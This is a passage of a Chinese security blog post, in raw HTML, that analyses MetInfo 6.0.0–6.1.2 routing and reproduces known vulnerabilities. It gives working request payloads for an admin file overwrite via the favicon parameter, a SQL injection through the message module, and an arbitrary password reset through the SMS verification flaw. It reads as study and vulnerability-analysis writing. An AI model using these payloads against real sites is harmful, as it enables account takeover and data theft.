class="string">'.class.php'</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($action) &#123;<span class="comment">//action=doexport</span></span><br><span class="line">			<span class="keyword">if</span> (!class_exists($classname))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">die</span>($classname . <span class="string">' '</span> . $action . <span class="string">' class\'s file is not exists!!!'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">self</span>::$mclass[$classname])&#123;</span><br><span class="line">				$newclass = <span class="keyword">self</span>::$mclass[$classname];</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">if</span>($is_myclass)&#123;<span class="comment">//is_myclass=0</span></span><br><span class="line">					$newclass = <span class="keyword">new</span> $myclass;</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					$newclass = <span class="keyword">new</span> $classname;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">self</span>::$mclass[$classname] = $newclass;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> ($action!=<span class="string">'new'</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span>(substr($action, <span class="number">0</span>, <span class="number">2</span>) != <span class="string">'do'</span>)&#123;</span><br><span class="line">					<span class="keyword">die</span>($action.<span class="string">' function no permission load!!!'</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(method_exists($newclass, $action))&#123;</span><br><span class="line">					call_user_func(<span class="keyword">array</span>($newclass, $action));</span><br><span class="line">				&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">					<span class="keyword">die</span>($action.<span class="string">' function is not exists!!!'</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> $newclass;</span><br><span class="line">		&#125;</span><br><span class="line">				<span class="keyword">return</span>  <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>后半段代码判断$action是否可执行，<strong><code>_load_class()</code></strong>方法可以引用并实例化一个类，当$action为空的时候，只引用文件。<br>如果$action为new,则实例化该类，否则如果$action以do开头，则实例化该类，并且调用该函数<br>要想包含app/system/feedback/admin/feedback_admin.class.php文件，需要满足<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">M_NAME = $_GET[<span class="string">'n'</span>] = feedback;</span><br><span class="line">M_MODULE = $_GET[<span class="string">'m'</span>] = admin;</span><br><span class="line">M_CLASS = $_GET[<span class="string">'c'</span>] = feedback_admin;</span><br><span class="line">M_ACTION= $_GET[<span class="string">'a'</span>] = doexport<span class="comment">//需要调用某do方法</span></span><br></pre></td></tr></table></figure></p>
<p>至此，就调用了app/system/feedback/admin/feedback_admin.class.php::doexport()函数<br>也就是我们上文提到的:每一个index.php里面都包含了entrance.php，然后有定义需要调用的模块，类，方法。这是被写死了。这个cms的特色就在于此。定义了这些的常量，调用方法就会如下所言<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path:/app/system/M_NAME/M_MODULE/M_CLASS.class.php     函数 M_ACTION</span><br></pre></td></tr></table></figure></p>
<h3 id="0x02-2-2-MetInfo6-0-0后台任意文件读取下载"><a href="#0x02-2-2-MetInfo6-0-0后台任意文件读取下载" class="headerlink" title="0x02.2.2 MetInfo6.0.0后台任意文件读取下载"></a>0x02.2.2 MetInfo6.0.0后台任意文件读取下载</h3><p>寻找一下漏洞的位置，根据提示是在webset模块，所以到webset.class.php<br>发现在函数doseteditor()发现了漏洞的位置<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doseteditor</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $_M;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'met_ico'</span>] != <span class="string">'../favicon.ico'</span>)&#123;</span><br><span class="line">			copy($_M[<span class="string">'form'</span>][<span class="string">'met_ico'</span>], <span class="string">'../favicon.ico'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		... ...</span><br><span class="line">		... ...</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们会发现如果用户输入met_ico的值，就可以指定替换../favicon.ico的内容，试着构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?lang=cn&amp;n=webset&amp;c=webset&amp;a=doseteditor&amp;met_ico=../index.php</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/14/在审计中学到的路由利用/3.png" alt=""></p>
<h3 id="0x02-2-3-6-1-2版本中的一个sql注入"><a href="#0x02-2-3-6-1-2版本中的一个sql注入" class="headerlink" title="0x02.2.3 6.1.2版本中的一个sql注入"></a>0x02.2.3 6.1.2版本中的一个sql注入</h3><p>在线留言处的注入方式是其中一个入口，这次我们选择另外一个入口进行注入，然后关于那个注入点的原理，就不细谈了，之前的文章分析过。<br>我们这里想要聊一聊的是这个是通过admin/index.php这个入口路由至这个方法。<br>这次的漏洞在/app/system/message/web/message.class.php<br>所以调用要满足：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M_NAME = $_GET[<span class="string">'n'</span>] = message;</span><br><span class="line"></span><br><span class="line">M_MODULE = $_GET[<span class="string">'m'</span>] = web;</span><br><span class="line"></span><br><span class="line">M_CLASS = $_GET[<span class="string">'c'</span>] = message;</span><br></pre></td></tr></table></figure></p>
<p>要想调用add()，必须实例化类并执行方法，但这里限定只能实例化并执行do开头的方法。这里找到了message.class.php中的domessage()，它调用了add()方法。<br><img src="/2019/07/14/在审计中学到的路由利用/4.png" alt=""><br>然后这里最终的payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/index.php?m=web&amp;n=message&amp;c=message&amp;a=domessage&amp;action=add&amp;lang=cn&amp;para137=1&amp;para186=1@qq.com&amp;para138=1&amp;para139=1&amp;para140=1&amp;id=42 and 1=1</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/07/14/在审计中学到的路由利用/5.png" alt=""></p>
<h3 id="0x02-2-4-Metinfo6-0-0任意用户密码修改"><a href="#0x02-2-4-Metinfo6-0-0任意用户密码修改" class="headerlink" title="0x02.2.4 Metinfo6.0.0任意用户密码修改"></a>0x02.2.4 Metinfo6.0.0任意用户密码修改</h3><p>在忘记密码处由于username可控导致任意用户密码修改</p>
<p>漏洞文件：\MetInfo6.0.0\app\system\user\web\getpassword.class.php<br>漏洞函数：dotelvalid()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dotelvalid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $_M;</span><br><span class="line">		$session = load::sys_class(<span class="string">'session'</span>, <span class="string">'new'</span>);</span><br><span class="line">		<span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]!=$session-&gt;get(<span class="string">"phonecode"</span>))&#123;</span><br><span class="line">			okinfo($_M[<span class="string">'url'</span>][<span class="string">'getpassword'</span>], $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(time()&gt;$session-&gt;get(<span class="string">"phonetime"</span>))&#123;</span><br><span class="line">			okinfo($_M[<span class="string">'url'</span>][<span class="string">'getpassword'</span>], $_M[<span class="string">'word'</span>][<span class="string">'codetimeout'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		$session-&gt;del(<span class="string">'phonecode'</span>);</span><br><span class="line">		$session-&gt;del(<span class="string">'phonetime'</span>);</span><br><span class="line">		$user = <span class="keyword">$this</span>-&gt;userclass-&gt;get_user_by_tel($_M[<span class="string">'form'</span>][<span class="string">'username'</span>]);</span><br><span class="line">		<span class="keyword">if</span>($user)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;userclass-&gt;editor_uesr_password($user[<span class="string">'id'</span>],$_M[<span class="string">'form'</span>][<span class="string">'password'</span>]))&#123;</span><br><span class="line">				okinfo($_M[<span class="string">'url'</span>][<span class="string">'login'</span>], $_M[<span class="string">'word'</span>][<span class="string">'modifypasswordsuc'</span>]);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				okinfo($_M[<span class="string">'url'</span>][<span class="string">'login'</span>], $_M[<span class="string">'word'</span>][<span class="string">'opfail'</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			okinfo($_M[<span class="string">'url'</span>][<span class="string">'login'</span>], $_M[<span class="string">'word'</span>][<span class="string">'NoidJS'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里的phonecode是发给某手机的手机验证码，我们填入的验证码与此时页面发出的验证码的正确性以及验证码的时效性<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_M[<span class="string">'form'</span>][<span class="string">'code'</span>]!=$session-&gt;get(<span class="string">"phonecode"</span>))&#123;</span><br><span class="line">			okinfo($_M[<span class="string">'url'</span>][<span class="string">'getpassword'</span>], $_M[<span class="string">'word'</span>][<span class="string">'membercode'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(time()&gt;$session-&gt;get(<span class="string">"phonetime"</span>))&#123;</span><br><span class="line">			okinfo($_M[<span class="string">'url'</span>][<span class="string">'getpassword'</span>], $_M[<span class="string">'word'</span>][<span class="string">'codetimeout'</span>]);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<p>接着过了验证，修改某用户名的密码，这里未将用户名与验证码关联，导致我们可以给自己手机发验证码，然后填写其他人的用户名，强行修改密码<br>payload如下：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://../metinfo6.0.0/amdin/index.php?lang=cn&amp;n=user&amp;m=web&amp;c=password&amp;a=dotelvalid&amp;username=目标手机号&amp;password=密码&amp;code=接到的验证码</span><br></pre></td></tr></table></figure></p>
<h1 id="0x03-写在最后"><a href="#0x03-写在最后" class="headerlink" title="0x03 写在最后"></a>0x03 写在最后</h1><p>太菜了，对于cms的路由结构，以及整体的功能模块之间的联系，不够熟悉，代码编写能力有待提高，对于常见工具，比如phpstorm,sqlmap….的使用还不够熟练，太菜了</p>

      
    </div>

    

    
      
    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/13/metinfo6-0-0-6-1-2sql注入-复现/" rel="next" title="metinfo6.0.0-6.1.2sql注入[复现]">
                <i class="fa fa-chevron-left"></i> metinfo6.0.0-6.1.2sql注入[复现]
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/16/phpcmsv9文件包含漏洞-复现/" rel="prev" title="phpcmsv9文件包含漏洞[复现]">
                phpcmsv9文件包含漏洞[复现] <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">

          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
  
    <img class="site-author-image" itemprop="image" src="/images/name.png" alt="cookie">
  
  <p class="site-author-name" itemprop="name">cookie</p>
  <div class="site-description motion-element" itemprop="description"></div>
</div>


  <nav class="site-state motion-element">
    
      <div class="site-state-item site-state-posts">
        
          <a href="/archives/">
        
          <span class="site-state-item-count">71</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
    

    

    
  </nav>













          
          
        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01前言"><span class="nav-number">1.</span> <span class="nav-text">0x01前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-1菜的明明白白"><span class="nav-number">1.1.</span> <span class="nav-text">0x01.1菜的明明白白</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-2准备"><span class="nav-number">1.2.</span> <span class="nav-text">0x01.2准备</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">0x02漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Metinfo6-0-0后台sql注入"><span class="nav-number">2.1.</span> <span class="nav-text">Metinfo6.0.0后台sql注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-2demo一下，"><span class="nav-number">2.2.</span> <span class="nav-text">0x02.2demo一下，</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-2-1-在线反馈处后台sql注入"><span class="nav-number">2.2.1.</span> <span class="nav-text">0x02.2.1 在线反馈处后台sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#——-分割线———"><span class="nav-number">2.2.1.1.</span> <span class="nav-text">——-分割线———</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-2-2-MetInfo6-0-0后台任意文件读取下载"><span class="nav-number">2.2.2.</span> <span class="nav-text">0x02.2.2 MetInfo6.0.0后台任意文件读取下载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-2-3-6-1-2版本中的一个sql注入"><span class="nav-number">2.2.3.</span> <span class="nav-text">0x02.2.3 6.1.2版本中的一个sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-2-4-Metinfo6-0-0任意用户密码修改"><span class="nav-number">2.2.4.</span> <span class="nav-text">0x02.2.4 Metinfo6.0.0任意用户密码修改</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-写在最后"><span class="nav-number">3.</span> <span class="nav-text">0x03 写在最后</span></a></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">cookie</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.2.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>










  
  













  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>




  <script src="/js/utils.js?v=7.2.0"></script>

  <script src="/js/motion.js?v=7.2.0"></script>



  
  


  <script src="/js/schemes/muse.js?v=7.2.0"></script>



  
  <script src="/js/scrollspy.js?v=7.2.0"></script>
<script src="/js/post-details.js?v=7.2.0"></script>



  <script src="/js/next-boot.js?v=7.2.0"></script>

  

  

  

  

  


  


  




  

  

  

  

  

  

  

  

  

  

  

  

  


  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
